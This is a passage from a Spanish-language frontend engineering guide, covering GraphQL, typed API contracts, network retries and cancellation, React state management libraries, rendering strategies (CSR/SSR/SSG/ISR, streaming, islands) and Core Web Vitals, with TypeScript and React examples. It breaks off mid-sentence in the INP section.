    // SQL conceptual: SELECT * FROM products ORDER BY id LIMIT 20 OFFSET 40;

    // Cursor: estable, típico en feeds infinitos (timelines, redes sociales)
    fetch('/api/products?after=eyJpZCI6NDJ9&limit=20').then((res) => res.json());
    // Respuesta: { data: [...], nextCursor: "eyJpZCI6NjJ9" }
    // Siguiente: fetch(`/api/products?after=${nextCursor}&limit=20`);
    // SQL conceptual: SELECT * FROM products WHERE id > 42 ORDER BY id LIMIT 20;

    // ¿Cuándo? Admin con "página 1 2 3" / datos chicos → offset
    // Feed infinito / muchos datos / lista que cambia → cursor
    ```

### En profundidad

- GraphQL: qué problema resuelve y su propio problema (N+1)

  - **Teoría**: en una frase — **GraphQL** = el cliente declara los
    campos; un endpoint evita over/under-fetching de REST. **N+1** =
    esa query anidada puede disparar 1+N consultas en DB; se mitiga con
    batching (DataLoader). Un HTTP ≠ una query barata en base de datos.

    En REST cada endpoint devuelve una forma fija: **over-fetching**
    (traes campos que no usas) o **under-fetching** (varios round-trips
    para una pantalla). Analogía: REST = menú fijo del restaurante;
    GraphQL = pides solo lo que quieres.

    Cómo funciona: un endpoint (p. ej. `POST /graphql`); el cliente manda
    una **query** (lectura) o **mutation** (escritura) con el árbol de
    campos; el servidor resuelve y responde con esa misma forma. El
    cliente declara exactamente qué necesita — sin over-fetching; datos
    anidados en un request — sin under-fetching.

    El costo: **N+1** — resolver una lista de N elementos puede disparar
    una consulta a la DB por cada uno (1 de la lista + N hijos) en vez de
    un lote. Mitigarlo (*DataLoader*, batching) es del backend; el
    frontend senior reconoce el síntoma: latencia alta en queries
    anidadas aunque sea "un solo request HTTP".
  - **Ejemplo**:
    ```graphql
    # El cliente pide exactamente estos campos: sin over-fetching
    query ObtenerPedido($id: ID!) {
      order(id: $id) {
        id
        total
        customer {
          name # sin GraphQL sería un segundo request a /customers/:id
        }
      }
    }
    # Respuesta con la misma forma: { data: { order: { id, total, customer: { name } } } }

    mutation CrearPedido($input: OrderInput!) {
      createOrder(input: $input) {
        id
      }
    }
    ```
    Si `order` trae 50 líneas y cada una resuelve su producto con una
    consulta individual: 1 + 50 = 51 queries a la DB — el clásico N+1.
    Con batching: una sola `WHERE id IN (...)` para los 50 productos.

- Diseño de contrato API desde el consumidor: tipos compartidos y generación de tipos

  - **Teoría**: en una frase — **contrato tipado** = que el frontend no
    invente la forma de la API; **OpenAPI** = generar tipos desde el
    spec; **tRPC** = compartir el tipo del router del server con el
    client. Así TypeScript valida el contrato real, no una interface
    desactualizada.

    Si el frontend define a mano `interface Product { ... }` sin garantía
    de que coincida con lo que el backend envía, el contrato se
    desincroniza en silencio: TS valida contra un tipo que ya no refleja
    la realidad (falsa seguridad). Analogía: un plano que ya no coincide
    con la obra; el inspector solo mira el plano.

    Dos soluciones consolidadas:

    1. **OpenAPI** → generador (`openapi-typescript`): el spec YAML/JSON
       describe la API REST; se generan tipos TS del cliente. Flujo:
       `openapi.yaml` → herramienta → `api-types.ts` → fetch tipado.
       Cuando cambia la API, regeneras. Ideal si backend/frontend están
       separados (el OpenAPI debe mantenerse al día).
    2. **tRPC**: en un monorepo, el tipo de retorno de un procedure del
       servidor *es* el tipo del cliente (`AppRouter`). Sin esquema
       intermedio ni `.d.ts` manual; un cambio en el server rompe el
       compile del client.
  - **Ejemplo**:
    ```bash
    # A partir de un openapi.yaml, genera tipos TS reales para el cliente
    npx openapi-typescript ./openapi.yaml -o ./src/api-types.ts
    ```
    ```ts
    // Con tRPC: el tipo de "getProduct" viaja del backend al frontend
    // server.ts
    export const appRouter = router({
      getProduct: publicProcedure
        .input(z.string())
        .query(({ input }) => db.products.findById(input)), // el retorno define el tipo
    });
    export type AppRouter = typeof appRouter;

    // client.ts
    const trpc = createTRPCClient<AppRouter>({ url: '/api/trpc' });
    const product = await trpc.getProduct.query('42'); // tipado end-to-end, sin *.d.ts manual
    ```

- Manejo robusto de errores de red: reintentos, timeouts y cancelación

  - **Teoría**: en una frase — **timeout** = aborta si tarda demasiado;
    **retry + backoff** = reintenta solo fallos transitorios, con espera
    creciente; **cancelación** = mata peticiones obsoletas para evitar
    resultados viejos. Los tres evitan UX colgada, spam al server y
    races en búsquedas.

    Una petición puede fallar de formas que no son "el servidor rechazó":
    quedarse colgada, caer por red momentánea, o volverse innecesaria
    (el usuario navegó / cambió la búsqueda).

    - **Timeout** — con `AbortController` + `setTimeout` → `abort()` si
      pasa el límite (p. ej. 5s). Analogía: si el ascensor no abre, dejas
      de esperar.
    - **Retry con backoff exponencial** — reintenta solo errores
      transitorios (`5xx`, timeouts, red); **nunca** un `4xx` (error del
      cliente que no se arregla repitiendo). Espera creciente: 500ms,
      1s, 2s… para no saturar un servidor sobrecargado.
    - **Cancelación** — `AbortController` al cambiar de búsqueda/pantalla:
      cancela la petición en vuelo y evita que una respuesta vieja pise
      la nueva (race condition). Librerías como React Query / SWR ya
      cubren mucho de esto.
  - **Ejemplo paso a paso**:
    ```ts
    async function fetchConTimeoutYRetry(url: string, intentos = 3): Promise<Response> {
      for (let intento = 0; intento < intentos; intento++) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // timeout 5s

        try {
          const res = await fetch(url, { signal: controller.signal });
          clearTimeout(timeoutId);
          if (res.status >= 500 && intento < intentos - 1) {
            // 5xx reintentable. Backoff: 500ms, 1000ms, 2000ms...
            await new Promise((r) => setTimeout(r, 500 * 2 ** intento));
            continue;
          }
          return res; // éxito, o un 4xx que no tiene sentido reintentar
        } catch (err) {
          clearTimeout(timeoutId);
          if (intento === intentos - 1) throw err;
        }
      }
      throw new Error('No se pudo completar la petición');
    }

    // Cancelación en buscador: cada tecleo cancela la búsqueda anterior
    let controladorActual: AbortController | null = null;
    async function buscar(texto: string) {
      controladorActual?.abort();
      controladorActual = new AbortController();
      const res = await fetch(`/api/search?q=${texto}`, {
        signal: controladorActual.signal,
      });
      return res.json();
    }
    ```

## 6. Gestión de estado y datos

### Básico

- Las tres categorías de estado, y por qué mezclarlas es un antipatrón

  - **Teoría**: en una frase — **local** = UI de un componente;
    **global de UI** = preferencias/sesión compartidas, no caché de API;
    **servidor** = copia de datos remotos (usa librería de server state).
    Mezclar servidor en el store de UI es antipatrón: pierdes
    caché/invalidación y complicas la arquitectura.

    No todo "estado" es del mismo tipo. Pregunta de dónde viene y a quién
    le importa → eliges categoría → eliges herramienta.

    - **Estado local** — solo le importa a ese componente y sus hijos
      (`useState`/`useReducer`): modal abierto, valor de un input. Nace y
      muere con el componente.
    - **Estado global de UI** — compartido, no viene de una API; cambia
      poco (tema, idioma, sesión). Context o store ligero. Fuente de
      verdad: la app.
    - **Estado de servidor** — copia cacheada de datos que viven en el
      backend (productos, perfil remoto). Puede quedar desactualizado;
      necesita loading, error, refetch, invalidación, deduplicación.
      Librerías especializadas (ver "en profundidad") ya lo resuelven.

    Analogía: local = post-it; global UI = pizarra de la oficina;
    servidor = fotocopia del archivo central (hay que revalidar).

    El antipatrón: meter estado de servidor en el mismo store que la UI
    global y reimplementar a mano caché, invalidación y loading.
  - **Ejemplo**:
    ```tsx
    // Antipatrón: tratar datos del servidor igual que estado de UI puro
    const [usuarioActual, setUsuarioActual] = useState(null); // UI global: OK
    const [productos, setProductos] = useState([]); // esto es estado de SERVIDOR
    useEffect(() => {
      fetch('/api/products').then((r) => r.json()).then(setProductos);
      // A mano: caché, revalidación, deduplicación, loading/error...
      // lo que una librería de estado de servidor ya resuelve.
    }, []);
    ```

- Context API y su problema de rendimiento

  - **Teoría**: `Context` resuelve el problema de pasar props a través de
    muchos niveles intermedios (*prop drilling*), pero tiene una
    limitación importante: cuando el valor de un `Provider` cambia,
    **todos** los componentes que consumen ese contexto con `useContext`
    se re-renderizan, sin importar si a ese componente en particular le
    importa la parte del valor que cambió. Si el contexto agrupa varios
    datos no relacionados (usuario + tema + idioma) en un solo objeto,
    cambiar cualquiera de ellos re-renderiza a **todos** los consumers de
    los otros dos también.
  - **Ejemplo**:
    ```tsx
    // Un solo contexto con datos que cambian a ritmos distintos: mala señal
    const AppContext = createContext({ usuario: null, tema: 'claro', notificaciones: [] });

    // Si "notificaciones" cambia cada pocos segundos (polling), CUALQUIER
    // componente que solo lea "tema" desde este contexto se re-renderiza
    // igual, aunque el tema nunca haya cambiado.
    function BotonTema() {
      const { tema } = useContext(AppContext); // re-renderiza también con cada notificación nueva
      return <button>{tema}</button>;
    }
    ```

- Cuándo Context es suficiente vs cuándo hace falta una librería

  - **Teoría**: Context es la herramienta correcta para estado de UI que
    cambia poco y tiene pocos consumers (tema, idioma, usuario
    autenticado). Cuando el estado cambia con frecuencia, tiene muchos
    consumers distribuidos por el árbol, o necesita selectores (leer solo
    una parte específica sin re-renderizar por cambios en el resto), una
    librería dedicada (Zustand, Redux, Jotai — ver "en profundidad")
    resuelve el problema de raíz con una suscripción granular, en vez de
    forzar a dividir el contexto en cada vez más providers anidados para
    esquivar el problema.
  - **Ejemplo**: la señal de alarma típica es un árbol de providers que
    crece sin parar solo para separar cada pedazo de estado:
    ```tsx
    // Cuando llegas a esto, es señal de que Context ya no escala bien
    <UsuarioProvider>
      <TemaProvider>
        <CarritoProvider>
          <NotificacionesProvider>
            <App />
          </NotificacionesProvider>
        </CarritoProvider>
      </TemaProvider>
    </UsuarioProvider>
    ```

### En profundidad

- Estado de servidor con caché: el patrón *stale-while-revalidate*

  - **Teoría**: en una frase — **SWR** = muestra caché ya + revalida en
    segundo plano; la **query key** identifica y comparte esa caché; tras
    mutaciones, **invalidas** para forzar refetch. Evita reinventar
    caché/loading/dedupe con `useEffect`.

    Librerías como React Query y **SWR** (*stale-while-revalidate* — ver
    Glosario; también el nombre de la librería) tratan cada petición como
    una entrada de caché. Analogía: enseñas la fotocopia de ayer al
    instante; mientras, alguien verifica en el archivo si cambió.

    Cómo funciona: (1) primera visita → sin caché → fetch → spinner →
    guardas con una query key; (2) vuelves / otro componente usa la misma
    key → muestras data cacheada ya (aunque esté *stale*) y en background
    revalidas; si cambió, actualizas la UI sin spinner; (3) tras una
    mutación → `invalidateQueries` marca la key obsoleta → refetch.

    Frente a `useEffect` + `useState` manual resuelven: **caché** y
    **deduplicación** (misma key = una petición), **invalidación** tras
    mutar, **refetch en background** (también al recuperar el foco de la
    pestaña), estados `data`/`isLoading`/`isError` y reintentos sin
    orquestarlo a mano. Tú declaras qué datos necesitas; la librería
    gestiona el ciclo de vida del estado de servidor.
  - **Ejemplo**:
    ```tsx
    import { useQuery, useQueryClient } from '@tanstack/react-query';

    function ListaProductos() {
      // query key: misma key → misma caché / una sola petición
      const { data, isLoading } = useQuery({
        queryKey: ['products'],
        queryFn: () => fetch('/api/products').then((r) => r.json()),
        staleTime: 60_000, // "frescos" 1 min: no revalida de inmediato
      });

      if (isLoading) return <Spinner />;
      return <ul>{data.map((p) => <li key={p.id}>{p.name}</li>)}</ul>;
    }

    function useCrearProducto() {
      const queryClient = useQueryClient();
      return async (producto) => {
        await fetch('/api/products', {
          method: 'POST',
          body: JSON.stringify(producto),
        });
        // marca ['products'] obsoleto → refetch → la lista se actualiza
        queryClient.invalidateQueries({ queryKey: ['products'] });
      };
    }
    ```
    Ninguna de estas garantías (caché, dedup, invalidación, refetch en
    background) existe en un `useState` + `useEffect` manual sin
    reimplementarlas a mano.

- Zustand vs Redux vs Jotai: qué problema resuelve cada uno

  - **Teoría**: en una frase — **Redux** = store único + actions/reducers
    (predecible, más ceremonia); **Zustand** = store mínimo + selectors
    (poco boilerplate, re-renders finos); **Jotai** = átomos
    independientes que combinas. Los tres = estado de **UI**; no
    reemplazan caché de servidor (React Query / SWR).

    **Redux** centraliza el estado en un único store inmutable:
    `dispatch(action)` → `reducer` → nuevo state. Muy predecible y con
    DevTools (time-travel); más código ceremonial (Redux Toolkit lo
    reduce). Analogía: banco central con formularios oficiales.

    **Zustand** ofrece un store global minimalista: estado + funciones
    `set`, suscripción granular por selector (el componente solo
    re-renderiza si el pedazo que lee cambió — evita el problema de
    Context). Analogía: caja compartida; solo te avisan si cambió lo que
    miras.

    **Jotai** usa un modelo **atómico** bottom-up: en vez de un store
    único, defines átomos pequeños e independientes y los combinas.
    Útil cuando el "global" son muchos pedazos no relacionados. Analogía:
    Lego.

    Regla práctica: Zustand por simplicidad; Redux si el equipo/tooling
    lo pide; Jotai si el estado se siente más átomos que un store.
  - **Ejemplo**:
    ```tsx
    // Zustand: sin boilerplate, selector = suscripción granular
    const useCarritoStore = create((set) => ({
      items: [],
      agregar: (item) => set((state) => ({ items: [...state.items, item] })),
    }));
    function ContadorCarrito() {
      // Solo re-renderiza si items.length cambia
      const cantidad = useCarritoStore((state) => state.items.length);
      return <span>{cantidad}</span>;
    }

    // Jotai: átomos independientes
    const temaAtom = atom('claro');
    const usuarioAtom = atom(null);
    function BotonTema() {
      const [tema, setTema] = useAtom(temaAtom); // no le importa usuarioAtom
      return (
        <button onClick={() => setTema(tema === 'claro' ? 'oscuro' : 'claro')}>
          {tema}
        </button>
      );
    }

    // Redux (idea): dispatch({ type: 'carrito/agregar', payload: item })
    // → reducer actualiza el store central → subscribers
    ```

- Normalización de estado

  - **Teoría**: en una frase — **normalizar** = entidades planas por id +
    referencias, como tablas de una DB. Evita copias duplicadas
    anidadas; un cambio se hace en un solo lugar. En UI haces el "join"
    al leer.

    Guardar datos anidados y duplicados (cada pedido con una copia
    completa del cliente) genera inconsistencias: si cambia el nombre del
    cliente, hay que actualizar **todas** las copias. Analogía: el mismo
    contacto pegado en 50 hojas; cambias el teléfono y se te olvidan 3.

    **Normalizar** = guardarlo como mini base de datos en memoria:
    entidades planas indexadas por id (`byId`), orden en `allIds`, y
    relaciones por id (`clienteId`) en vez de objetos anidados. Igual que
    tablas relacionales. Al renderizar, resuelves el join en memoria.
    Herramientas como Normalizr o Entity Adapter (Redux Toolkit)
    automatizan el patrón.
  - **Ejemplo**:
    ```ts
    // Sin normalizar: Ana duplicada en cada pedido
    const pedidos = [
      { id: 1, cliente: { id: 9, nombre: 'Ana' }, total: 100 },
      { id: 2, cliente: { id: 9, nombre: 'Ana' }, total: 50 },
    ];

    // Normalizado: una fuente de verdad por entidad
    const estado = {
      pedidos: {
        byId: {
          1: { id: 1, clienteId: 9, total: 100 },
          2: { id: 2, clienteId: 9, total: 50 },
        },
        allIds: [1, 2],
      },
      clientes: {
        byId: { 9: { id: 9, nombre: 'Ana' } },
      },
    };
    // Actualizar Ana = un solo cambio
    // estado.clientes.byId[9].nombre = 'Ana María';

    // Al leer en UI: join en memoria
    // estado.pedidos.allIds.map((id) => {
    //   const pedido = estado.pedidos.byId[id];
    //   const cliente = estado.clientes.byId[pedido.clienteId];
    //   return `${pedido.id} — ${cliente.nombre}`;
    // });
    ```

- Actualizaciones optimistas a nivel de librería

  - **Teoría**: la sección 5 de `GOOD-FRONTEND-PRACTICES.md` ya cubrió el
    concepto de actualización optimista con rollback manual. Las
    librerías de estado de servidor lo formalizan como una función de
    primera clase: puedes decirle a la librería "muestra este valor de
    inmediato" y ella se encarga de revertirlo automáticamente al caché
    anterior si la mutación falla, sin que el componente tenga que guardar
    manualmente el valor previo para poder deshacerlo.
  - **Ejemplo**:
    ```tsx
    const mutation = useMutation({
      mutationFn: (id: string) => fetch(`/api/likes/${id}`, { method: 'POST' }),
      onMutate: async (id) => {
        await queryClient.cancelQueries({ queryKey: ['post', id] });
        const anterior = queryClient.getQueryData(['post', id]); // guarda el snapshot
        queryClient.setQueryData(['post', id], (post) => ({ ...post, liked: true })); // optimista
        return { anterior }; // se pasa al contexto de onError
      },
      onError: (err, id, context) => {
        queryClient.setQueryData(['post', id], context.anterior); // rollback automático
      },
    });
    ```

## 7. Estrategias de renderizado y meta-frameworks

### Básico

- CSR, SSR, SSG e ISR: definición y trade-offs

  - **Teoría**: en una frase — **CSR** = HTML en el cliente (SPA);
    **SSR** = HTML en cada request en el server (+ hidratación JS);
    **SSG** = HTML en build, CDN; **ISR** = estático + regeneración
    periódica. Eliges según SEO, frescura de datos y costo de servidor.

    Las cuatro responden: "¿dónde y cuándo se genera el HTML?"

    - **CSR** (*Client-Side Rendering*): el servidor manda HTML casi
      vacío; el browser descarga JS y React renderiza ahí. Tras la carga,
      navegaciones SPA rápidas y costo de servidor mínimo. Trade-off: TTI
      más lento; SEO flojo si el crawler no ejecuta JS.
      Flujo: request → HTML vacío + JS → render en cliente → contenido.

    - **SSR** (*Server-Side Rendering*): el servidor genera el HTML
      completo en cada petición (buen SEO y primer pintado con datos).
      Ese HTML llega **inerte**: se ve, pero los `onClick` aún no
      funcionan. Luego el browser descarga el JS y React **hidrata**:
      vuelve a ejecutar el árbol en memoria, adjunta listeners al DOM
      existente y verifica que coincida con lo del server. Hidratar ≠
      volver a pintar desde cero; es enlazar React al HTML ya pintado.
      Hasta que termina, la página puede verse lista pero no responder
      al primer clic. Trade-off: cada visita cuesta CPU/latencia de
      servidor.
      Flujo: request → server arma HTML → browser pinta → JS → hidrata →
      interactivo.

    - **SSG** (*Static Site Generation*): el HTML se genera **una vez en
      build** y se sirve desde un CDN (lo más rápido y barato). Trade-off:
      datos fijos hasta el próximo build.
      Flujo: build → HTML estático → request sirve archivo.

    - **ISR** (*Incremental Static Regeneration*): híbrido — sirve la
      versión estática cacheada (rápida, como SSG) y la regenera en
      segundo plano tras un tiempo configurado, sin rebuild completo del
      sitio. Puede servir un instante "viejo" mientras regenera.

    Analogía: CSR = montas el mueble en casa; SSR = te lo arman en cada
    pedido (+ baterías = hidratación); SSG = viene armado de fábrica;
    ISR = armado de fábrica y cada cierto tiempo lo rehacen.
  - **Ejemplo**: una tienda online suele combinar las cuatro:
    ```
    /                     -> SSG (home estable, se pre-genera)
    /productos/[slug]     -> ISR (miles de productos, precios cambian a ratos)
    /checkout             -> CSR (muy interactivo, autenticado, sin SEO)
    /buscar?q=zapatillas  -> SSR (resultado distinto en cada query)
    ```

- Hidratación y por qué puede ser costosa

  - **Teoría**: en una frase — **hidratación** = React descarga el JS,
    reconstruye el árbol en memoria y **adjunta** listeners al HTML del
    server (no lo vuelve a pintar desde cero). Hasta que termina, la
    página se ve lista pero puede no responder al clic.

    Cuando SSR/SSG entregan HTML ya generado, ese HTML es "inerte" — se
    ve completo, pero ningún `onClick` funciona todavía. Analogía: un
    muñeco ya vestido; hidratar es ponerle baterías y cables.

    El costo: React procesa **todo** el árbol para hidratarlo, aunque el
    90% sea estático (footer, nav) y jamás cambie — CPU que compite con
    la interactividad temprana, sobre todo en dispositivos de gama baja.
  - **Ejemplo**: el síntoma clásico es una página que **se ve** lista
    (el HTML ya está pintado) pero no responde al primer clic un instante
    — React todavía está hidratando. Eso es lo que atacan streaming,
    islands y resumability (más abajo).

### En profundidad

- Streaming SSR y Suspense en el servidor

  - **Teoría**: en una frase — **streaming SSR** = enviar HTML por
    trozos; **Suspense en servidor** = frontera de lo que puede llegar
    tarde (fallback primero, contenido después). Una sección lenta ya no
    bloquea el shell de toda la página.

    El SSR tradicional espera a que **todo** el árbol esté listo
    (incluyendo datos lentos) antes del primer byte de HTML — una parte
    lenta retrasa toda la página. El **streaming SSR** (ver `REACT19.md`)
    envía HTML por partes: el shell sale de inmediato; cada `<Suspense>`
    que envuelve algo lento manda primero el fallback y, cuando los datos
    están listos, un fragmento que reemplaza ese placeholder in-place.

    Flujo: request → server envía layout + fallbacks → resuelve la parte
    lenta → envía chunk que sustituye el spinner → el browser actualiza
    esa zona sin esperar el documento completo. Analogía: te traen pan y
    plato principal ya; el postre llega después — no esperas en la puerta
    a que esté todo.

    Streaming mejora *cuándo* llega el HTML; después sigue haciendo falta
    hidratar para la interactividad (no elimina la hidratación).
  - **Ejemplo**:
    ```tsx
    // Header/layout salen ya; reviews (lentas) en un chunk posterior
    function ProductPage({ id }: { id: string }) {
      return (
        <Layout>
          <ProductHeader id={id} />
          <Suspense fallback={<SpinnerReviews />}>
            <ProductReviews id={id} /> {/* streaming: llega cuando está lista */}
          </Suspense>
        </Layout>
      );
    }
    ```
    El navegador recibe el spinner en el HTML inicial; cuando el servidor
    termina `ProductReviews`, envía un fragmento que reemplaza ese
    spinner, sin bloquear el resto de la página.

- Islands architecture y resumability como alternativas a hidratar todo

  - **Teoría**: en una frase — **islands** = HTML estático por defecto;
    solo hidratas componentes interactivos aislados (Astro).
    **Resumability** = el client reanuda el trabajo del server sin
    rehidratar todo el árbol; JS al interactuar (Qwik). Ambas evitan el
    costo de "hidratar toda la página".

    La hidratación clásica de React hace que el cliente re-ejecute casi
    todo el árbol en JS para activar clicks — caro aunque el 90% sea
    estático. Dos enfoques atacan eso:

    **Islands (Astro)** — océano de HTML con islas de interactividad. Por
    defecto todo es HTML puro (cero JS). Solo lo marcado
    (`client:load`, `client:visible`, etc.) se hidrata, de forma
    **independiente y aislada**. El resto nunca paga hidratación.
    Analogía: no enciendes toda la ciudad; solo las casas con gente.

    **Resumability (Qwik)** — en vez de re-ejecutar el árbol para
    reconstruir listeners, el server **serializa** en el HTML dónde
    estaban estado/handlers. El browser **reanuda** ahí (como un
    marcador en un libro), sin repetir trabajo. El JS de un componente
    ni se descarga hasta que el usuario interactúa con él.
  - **Ejemplo**:
    ```astro
    ---
    // Astro: el carrusel es una isla; el resto es HTML puro sin JS
    import Carousel from '../components/Carousel.jsx';
    ---
    <Layout>
      <h1>Bienvenida</h1> {/* HTML estático, cero JS */}
      <Carousel client:visible /> {/* isla: hidrata al entrar al viewport */}
    </Layout>
    ```
    Qwik (idea): al hacer clic se descarga solo el handler de ese
    botón — no se rehidrata toda la página al cargar.

- Framework para decidir qué estrategia usar según el tipo de página

  - **Teoría**: la pregunta correcta no es "¿cuál es la mejor estrategia?"
    sino "¿qué necesita **esta** página en particular?". Tres preguntas
    guía: (1) ¿necesita SEO/compartirse en redes? (descarta CSR puro);
    (2) ¿los datos cambian por usuario o son iguales para todos? (datos
    iguales para todos → candidato a SSG/ISR; datos personalizados →
    SSR/CSR); (3) ¿qué tan frecuente es la interacción una vez cargada?
    (mucha interacción sostenida → prioriza CSR tras la carga inicial,
    como un dashboard).
  - **Ejemplo** (aplicando el framework):
    ```
    Página de marketing (landing pública, mismo contenido para todos)
      -> SEO: sí. Datos: iguales para todos. Interacción: baja.
      -> SSG

    Dashboard autenticado (métricas del propio usuario, muy interactivo)
      -> SEO: no (está detrás de login). Datos: por usuario. Interacción: alta.
      -> CSR (quizás con un SSR inicial ligero solo para el layout)

    E-commerce: catálogo de productos (público, con precios que cambian)
      -> SEO: sí. Datos: casi iguales para todos, cambian ocasionalmente.
      -> ISR
    ```

## 8. Performance web y Core Web Vitals

Esto amplía la sección 1 de `GOOD-FRONTEND-PRACTICES.md` (donde ya hay un
resumen corto de LCP/CLS/INP) con la definición senior de **Core Web
Vitals (CWV)** — en español, las *métricas web esenciales* de experiencia
de página que usa Google (carga, interactividad y estabilidad visual) —
y con temas de pipeline, budgets y diagnóstico que no se cubrieron ahí.

### Básico

- Qué son los Core Web Vitals y cómo se evalúan

  - **Teoría**: los **Core Web Vitals (CWV)** — *Core* = esenciales,
    *Web Vitals* = métricas vitales de la web — son el subconjunto de Web
    Vitals que Google usa como señal de *page experience* en Search: tres
    métricas de **campo** (usuarios reales) que miden carga percibida
    (**LCP**), interactividad (**INP**) y estabilidad visual (**CLS**).
    Una página "pasa" solo si las **tres** están en umbral *good* en el
    **percentil 75 (p75)**, evaluado por separado en móvil y desktop —
    no basta con que la media se vea bien ni con que Lighthouse en tu
    laptop esté en verde.

    Umbrales oficiales (estables; INP reemplazó a FID en marzo 2024):

    ```
    Métrica   Good (esperado)   Needs improvement    Poor
    LCP       ≤ 2.5 s           ≤ 4 s                > 4 s
    INP       ≤ 200 ms          ≤ 500 ms             > 500 ms
    CLS       ≤ 0.1             ≤ 0.25               > 0.25
    ```

    Objetivo en producción: **p75 ≤ Good** en las tres, en móvil y en
    desktop. Eso es lo "esperado" / correcto para Search y UX.

    **No son Core Web Vitals** (pero sí útiles en lab/CI):

    ```
    FCP   ~≤ 1.8 s     primer contenido pintado (orientativo Lighthouse)
    TBT   ~≤ 200–300 ms  proxy de INP en lab (Lighthouse no mide INP de campo)
    ```

    **Herramientas — campo** (usuarios reales; lo que cuenta para Search):

    ```
    Herramienta              LCP  INP  CLS  Dónde verlo
    PageSpeed Insights        ✓    ✓    ✓   pagespeed.web.dev → bloque
                                            "real users" / field (CrUX)
    Search Console            ✓    ✓    ✓   Informe "Core Web Vitals"
    CrUX (dataset / dash)     ✓    ✓    ✓   Agregados Chrome a escala
    Librería web-vitals       ✓    ✓    ✓   onLCP / onINP / onCLS → tu RUM
    DevTools Performance*     ✓    ✓*   ✓   *INP solo si tú interactúas
                                            (1 sesión, no es p75)
    ```

    **Herramientas — laboratorio** (simulación; depurar y CI):

    ```
    Herramienta              LCP  INP     CLS  Dónde verlo
    Lighthouse (DevTools/CI)  ✓   no→TBT   ✓   Panel Lighthouse / PSI lab
    DevTools → Performance    ✓   parcial  ✓   Marcadores Web Vitals,
                                               Layout shifts, long tasks
    Lighthouse CI             ✓   no→TBT   ✓   Asserts en lighthouserc.json
    WebPageTest               ✓   limitado ✓   Lab avanzado (filmstrip)
    ```

    Por métrica, qué usar:

    - **LCP**: campo = PSI field / Search Console / `onLCP`. Lab =
      Lighthouse + Performance (elemento LCP). Esperado: p75 ≤ 2.5 s.
    - **INP**: campo = PSI field / Search Console / `onINP` (hace falta
      clic/tap/tecla). Lab = no hay INP fiable en Lighthouse → mira
      **TBT** + long tasks. Esperado: p75 ≤ 200 ms.
    - **CLS**: campo = PSI field / Search Console / `onCLS`. Lab =
      Lighthouse + Performance (Layout shifts). Esperado: p75 ≤ 0.1.

    Regla: **campo = verdad del umbral**; **lab = cómo arreglarlo**. En
    budgets de CI suele medirse LCP/CLS + TBT/FCP + peso JS.

    En una app **React**, los CWV no se "arreglan" solo con CSS: el
    tamaño del bundle, la hidratación, el code splitting y cómo actualizas
    el estado empujan LCP/INP/CLS. Más abajo: cómo mejorar cada métrica
    en React y una checklist de lo que siempre deberías evaluar.
  - **Ejemplo** (medir + flujo práctico):
    ```ts
    import { onLCP, onINP, onCLS } from 'web-vitals';

    // RUM propio: el agregador calcula p75 por URL / dispositivo
    onLCP((m) => enviarAMonitoreo('LCP', m.value)); // ms; good ≤ 2500
    onINP((m) => enviarAMonitoreo('INP', m.value)); // ms; good ≤ 200
    onCLS((m) => enviarAMonitoreo('CLS', m.value)); // score; good ≤ 0.1
    ```
    ```
    Flujo recomendado:
      1. Search Console / PSI (field) → ¿p75 móvil pasa LCP+INP+CLS?
      2. PSI (lab) / Lighthouse       → ¿qué falla y por qué?
      3. DevTools Performance         → debug (elemento LCP, shifts, tasks)
      4. web-vitals en prod           → RUM continuo por URL
      5. Lighthouse CI                → budget LCP, CLS, TBT, peso JS

    En PSI: bloque field = CrUX (Search); bloque lab = Lighthouse (debug).
    Optimiza con lab; valida el resultado con field.
    ```

- LCP (*Largest Contentful Paint*): cuándo aparece el contenido principal

  - **Teoría**: El LCP se mide desde el instante en que el usuario inicia
    la carga de la página (clic, enter, navegación interna, etc.), es
    decir, cuando el navegador comienza a procesar la nueva navegación:
    incluye tiempos de red y backend antes de que se vea cualquier
    contenido. El evento clave es cuando se **pinta el elemento de
    contenido más grande** visible en el viewport (por ejemplo, imagen
    hero, póster de video, bloque relevante de texto, etc.). Es la
    métrica de "¿cuándo el usuario siente que la página ya cargó lo
    importante?". Conectar con el Critical Rendering Path (sección 1):
    el LCP no puede ocurrir antes de layout + paint de ese elemento.

    Para depurar, descompón LCP en subpartes:

    ```
    LCP ≈ TTFB
        + resource load delay
        + resource load duration
        + element render delay
    ```

    - **TTFB**: HTML lento (servidor, red, redirects).
    - **Resource load delay**: el recurso LCP se descubrió tarde (solo
      referenciado desde CSS/JS, no desde el HTML inicial).
    - **Resource load duration**: peso, formato, CDN.
    - **Element render delay**: hilo principal ocupado (CSS/JS
      bloqueante, hidratación pesada) aunque el recurso ya llegó.

    **Cómo mejorarlo en React**: el LCP suele ser un `<img>` o un título
    en el HTML; si ese nodo solo aparece *después* de hidratar toda la
    app (`#root` vacío + bundle grande), pagas *render delay* y a veces
    *load delay* (la imagen se pide tarde desde un componente). Prioriza
    HTML temprano (SSR/RSC), code splitting de lo que no es el hero, y
    que el recurso LCP esté descubrible sin esperar a React.
  - **Ejemplo** (HTML del LCP + patrón React):
    ```html
    <!-- Mal: lazy en el hero retrasa el LCP a propósito -->
    <img src="/hero.jpg" alt="Hero" loading="lazy" />

    <!-- Bien: priorizar, reservar espacio, formato moderno -->
    <img
      src="/hero.avif"
      alt="Hero"
      width="1600"
      height="900"
      fetchpriority="high"
      decoding="async"
    />
    <link rel="preload" as="image" href="/hero.avif" fetchpriority="high" />
    ```
    ```tsx
    // Mal (CSR puro): el hero no existe hasta que React hidrata → LCP tarde
    createRoot(document.getElementById('root')!).render(<App />);
    // App monta Header + Hero + Dashboard + Charts de golpe

    // Mejor: lazy de lo no crítico; el LCP (Hero) en el chunk inicial
    // o, mejor aún, en HTML de SSR/RSC ya pintado
    const Dashboard = lazy(() => import('./Dashboard'));
    const Charts = lazy(() => import('./Charts'));

    function App() {
      return (
        <>
          <Hero /> {/* crítico: en el bundle inicial / HTML del servidor */}
          <Suspense fallback={<Skeleton />}>
            <Dashboard />
            <Charts />
          </Suspense>
        </>
      );
    }
    ```
    Otras prácticas React: `next/image` (o equivalente) con prioridad en
    el LCP; no envolver el hero en un Client Component pesado si puede
    ser estático/SSR; reducir JS del path crítico (menos providers
    globales en el árbol del primer paint).

- INP (*Interaction to Next Paint*): qué tan rápido responde la página

  - **Teoría**: INP (Interaction to Next Paint) mide el tiempo que tarda
    la página en mostrar un cambio visual después de una interacción del
    usuario (**clic, tap o tecla**), considerando **todas** las
